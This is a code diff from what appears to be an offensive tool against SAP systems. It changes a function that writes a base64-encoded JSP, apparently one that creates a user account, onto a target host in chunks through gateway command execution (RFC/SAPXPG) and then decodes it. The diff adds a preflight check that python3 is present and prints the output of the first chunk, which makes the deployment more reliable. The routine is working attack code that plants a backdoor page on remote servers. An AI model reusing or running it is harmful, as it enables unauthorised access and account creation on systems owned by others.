@@ -458,13 +458,29 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     chunks = [jsp_b64[i:i + chunk_size]
               for i in range(0, len(jsp_b64), chunk_size)]
 
+    # 0a) Preflight: on Linux confirm python3 is reachable.  If not,
+    # we'd silently waste ~40 RFC calls and then fail at decode.
+    if linux:
+        probe = exec_fn(chunk_shell, "--version")
+        probe_out = " ".join(str(l) for l in
+                                (probe.get("output") or [])).strip()
+        if not probe.get("success") or not probe_out:
+            return {"success": False,
+                    "error": (f"{chunk_shell} preflight failed on target "
+                              f"(output: {probe_out[:200] or '<empty>'}, "
+                              f"err: {probe.get('error', '?')}) — python3 "
+                              f"may not be in PATH for the gateway user.")}
+        print(f"[+] {node.sid}: preflight OK: {probe_out[:200]}")
+
     # 0) Clean up any prior leftover
     try:
         exec_fn(cleanup_shell, cleanup_args)
     except Exception:
         pass
 
-    # 1) Stream base64 chunks
+    # 1) Stream base64 chunks.  Surface the first chunk's stdout/stderr
+    # so silent failures (e.g. `python3 not in PATH`) show up before we
+    # spend minutes writing 40 useless chunks.
     for idx, chunk in enumerate(chunks):
         op = ">" if idx == 0 else ">>"
         r = exec_fn(chunk_shell, echo_args(chunk, op))
@@ -472,6 +488,14 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
             return {"success": False,
                     "error": f"chunk {idx+1}/{len(chunks)} write failed: "
                              f"{r.get('error', '?')}"}
+        if idx == 0:
+            out = " ".join(str(l) for l in (r.get("output") or [])).strip()
+            if out:
+                print(f"[*] {node.sid}: first-chunk output: "
+                      f"{out[:300]}")
+            else:
+                print(f"[*] {node.sid}: first-chunk output: "
+                      f"<empty — {chunk_shell} ran silently>")
 
     # 2) Decode to target JSP.  On Windows the /C wrapper is important
     #    so %TEMP% in the source path expands (SAPXPG does not resolve
